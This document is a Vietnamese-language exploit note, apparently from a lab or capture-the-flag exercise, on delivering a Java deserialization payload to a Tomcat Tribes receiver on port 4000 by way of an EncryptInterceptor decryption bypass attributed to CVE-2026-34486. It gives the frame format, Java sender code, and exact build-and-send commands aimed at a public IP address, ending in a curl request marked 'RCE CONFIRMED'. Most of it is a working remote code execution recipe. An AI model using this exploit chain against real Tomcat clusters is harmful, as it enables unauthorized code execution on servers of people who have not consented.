# 04 — Delivery qua Tribes (CVE-2026-34486 pattern)

## Tại sao java serialization trần không nổ

Gateway là **Tomcat Tribes receiver** (`tribes receiver tcp *:4000`), không phải socket readObject trần. Nó đọc theo frame của `XByteBuffer`:

```
START_DATA (7 bytes) | length (4 bytes BE) | ChannelData package | END_DATA (7 bytes)
```

Trong đó **ChannelData package** là Externalizable: `uniqueId(16) | timestamp(8) | options(4) | address | message`, và `message` chứa payload serialization thật.

Không đúng frame → listener đọc xong vứt đi, không bao giờ chạm tới readObject của payload.

## Lỗi đã mắc (đáng nhớ)

Tự chế frame bằng python: `len(4B) + blob + len(4B)` — sai format, gateway im lặng.
Tribes thật phải lấy `START_DATA`/`END_DATA` magic từ chính class `XByteBuffer` (reflect static field) — **không đoán được**.

Ngoài ra cần dependencies đúng:
- `catalina-tribes.jar` — class Tribes (`catalina.jar` KHÔNG chứa `org.apache.catalina.tribes.*`)
- `tomcat-juli.jar` — `ChannelData` init gọi `UUIDGenerator` cần `org.apache.juli.logging.LogFactory`

## EncryptInterceptor bypass (Entry 003 + 008)

Server cấu hình Tribes qua `EncryptInterceptor` (AES/CBC/PKCS5). CVE-2026-34486 (9.0.0.M1–9.0.116): khi decrypt fail, interceptor **không drop message** mà đánh dấu "FAILED TO DECRYPT" rồi vẫn chuyển tiếp xuống chuỗi interceptor kế tiếp → payload plaintext đến chỗ deserialize.

→ **Không cần biết/tìm AES key.** Gửi plaintext frame thẳng vào 4000.

## TribesSend.java — sender

```java
MemberImpl m = new MemberImpl();
m.setHost(new byte[]{10, 0, 0, 99});   // địa chỉ member giả
m.setPort(9999);

ChannelData cd = new ChannelData(true);
cd.setAddress(m);
cd.setMessage(new XByteBuffer(payload, false));  // gadget blob
cd.setOptions(8);                                 // SEND_OPTIONS_... (đã thử 0/2/4/8 đều qua)

byte[] cdBytes = cd.getDataPackage();

// frame đúng chuẩn XByteBuffer:
byte[] frame = START_DATA + int32(cdBytes.length) + cdBytes + END_DATA;
// START_DATA / END_DATA lấy bằng reflect static field của XByteBuffer

new Socket(host, 4000).getOutputStream().write(frame);
```

## Lệnh build & gửi

```bash
cd /tmp/tomcat
curl -sLO https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.116/bin/apache-tomcat-9.0.116.zip
unzip -q apache-tomcat-9.0.116.zip
curl -sLO https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-juli/9.0.116/tomcat-juli-9.0.116.jar

cd /tmp/cc321
CP="/tmp/tomcat/apache-tomcat-9.0.116/lib/*:/tmp/tomcat/tomcat-juli-9.0.116.jar:."
java -cp cc.jar:. Gen 'touch /opt/citadel/shared/T1' p_t1.bin
java -cp "$CP" --add-opens=java.base/java.lang.reflect=ALL-UNNAMED \
  TribesSend 91.107.164.78 4000 p_t1.bin 8
# frame=1398B ... SENT

curl "http://91.107.164.78:8080/mirror.jsp?parcel=T1"   # 200 = RCE CONFIRMED
```

## Hành vi quan sát được của gateway

- Connect ~280ms (so với port lân cận filtered/timeout 5s) → port thật, app thật
- Không bao giờ trả response ("it just listens" — Entry 001)
- Nhận 13MB dữ liệu không phàn nàn — đọc và vứt
- Một lần gửi `label=a&content=b` (không newline) → RST + listener chết ~5 phút rồi tự sống lại — đoán là crash do parse loop, không liên quan exploitation
